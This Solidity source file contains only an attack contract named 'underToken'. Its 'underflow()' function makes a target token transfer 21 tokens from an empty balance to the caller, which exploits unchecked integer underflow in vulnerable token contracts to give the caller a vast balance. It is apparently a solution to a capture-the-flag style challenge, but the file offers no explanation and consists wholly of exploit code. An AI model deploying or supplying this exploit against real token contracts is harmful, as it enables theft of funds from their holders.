// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

interface IntToken {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract underToken {
    IntToken public token;
    
    constructor(address _target) {
        token = IntToken(_target);
    }

    function underflow() public {
        token.transfer(msg.sender, 21);
    }

}
